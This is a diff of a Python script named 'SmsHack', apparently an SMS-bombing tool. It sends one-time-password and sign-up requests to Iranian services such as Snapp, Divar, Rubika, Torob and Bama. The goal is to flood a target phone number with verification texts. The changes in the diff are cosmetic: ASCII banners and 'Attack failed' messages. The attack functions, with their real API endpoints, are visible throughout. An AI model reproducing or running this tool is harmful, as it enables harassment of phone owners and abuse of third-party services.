@@ -8,35 +8,30 @@ proxy = {"https": "127.0.0.1.8000"}
 os.system("clear")
 print(Fore.GREEN)
 print("""
-
-
-
                                                                                                                                                _____                    
   ____              
 / ___|  _ __ ___   ____ | |  | |  __ _   ___  | | __
 \___ \ | '_ ` _ \ / __| | |__| | / _` | / __| | |/ /
  ___)  | | | | |  \__ \ |  __| ||(_| | | (__  |  <
 |____/ |_| |_| |_| ___/ | |  |_| \__,_| \___| |_|\_\
-
-
-
 """)
-sleep(3)
+sleep(4)
 os.system("clear")
 print(Fore.GREEN)
 print("""
 
+                                                                                                                               
+__  __       _         _ _         _   _            _
+|  \/  | __ _| |__   __| (_)       | | | | __ _  ___| | _____ _ __
+| |\/| |/ _` | '_ \ / _` | |       | |_| |/ _` |/ __| |/ / _ \ '__|
+| |  | | (_| | | | | (_| | |       |  _  | (_| | (__|   <  __/ |
+|_|  |_|\__,_|_| |_|\__,_|_| _____ |_| |_|\__,_|\___|_|\_\___|_|
+                            |_____|                          
 
 
-__  __       _         _ _     _   _            _
-|  \/  | __ _| |__   __| (_)   | | | | __ _  ___| | _____ _ __
-| |\/| |/ _` | '_ \ / _` | |   | |_| |/ _` |/ __| |/ / _ \ '__|
-| |  | | (_| | | | | (_| | |   |  _  | (_| | (__|   <  __/ |
-|_|  |_|\__,_|_| |_|\__,_|_|___|_| |_|\__,_|\___|_|\_\___|_|
-                          |_____|
+
                                                         
 ################################################################
-
   ---- >>>> SmsHack
 """)
 def snap(phone):
@@ -46,11 +41,11 @@ def snap(phone):
     try:
         snapR = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD)
         if "OK" in snapR.text:
-            print (Fore.GREEN+"[+]snap SEND")
+            print (Fore.Purple+"                         Snap")
         else:
-            print (Fore.GREEN+"[+]snap SEND")
+            print ("Attack failed :(")
     except:
-        print ("not send")
+        print ("Attack failed :(")
 
 def shad(phone):
     #shad api
@@ -59,7 +54,7 @@ def shad(phone):
     try:
         shadR = requests.post("https://shadmessenger12.iranlms.ir/", headers=shadH, json=shadD)
         if "OK" in shadR.text:
-            print (Fore.Green+"shad Send")
+            print (Fore.Purple+"                         shad")
         else:
             print ("Attack failed :(")
     except:
@@ -71,7 +66,7 @@ def gap(phone):
     try:
         gapR = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH)
         if "OK" in gapR.text:
-            print ("Start Mahdi_Hacker :)")
+            print (Fore.Purple+"                         Gap")
         else:
             print ("Attack failed :(")
     except:
@@ -84,7 +79,7 @@ def tap30(phone):
     try:
         tap30R = requests.post("https://tap33.me/api/v2/user", headers=tap30H, json=tap30D)
         if "OK" in tap30R.text:
-            print ("Start Mahdi_Hacker :)")
+            print (Fore.Purple+"                         tap30")
         else:
             print ("Attack failed :(")
     except:
@@ -107,7 +102,7 @@ def divar(phone):
     try:
         divarR = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD)
         if "SENT" in divarR.text:
-            print ("Start Mahdi_Hacker :)")
+            print (Fore.Purple+"                         Divar")
         else:
             print ("Attack failed :(")
     except:
@@ -120,7 +115,7 @@ def rubika(phone):
     try:
         ruR = requests.post("https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD)
         if "OK" in ruR.text:
-            print ("Start Mahdi_Hacker :)")
+            print (Fore.Purple+"                         Rubika")
         else:
             print ("Attack failed :(")
     except:
@@ -132,7 +127,7 @@ def torob(phone):
     try:
         torobR = requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=0"+phone.split("+98")[1], headers=torobH)
         if "sent" in torobR.text:
-            print ("Start Mahdi_Hacker :)")
+            print (Fore.Purple+"                         Torob")
         else:
             print ("Attack failed :(")
     except:
@@ -145,7 +140,7 @@ def bama(phone):
     try:
         bamaR = requests.post("https://bama.ir/signin-checkforcellnumber", headers=bamaH, data=bamaD)
         if "0" in bamaR.text:
-            print ("Start Mahdi_Hacker :)")
+            print (Fore.Purple+"                         Bama")
         else:
             print ("Attack failed :(")
     except:
@@ -169,3 +164,4 @@ try:
 
 except:
         print("not")
+© 2021 GitHub, Inc.
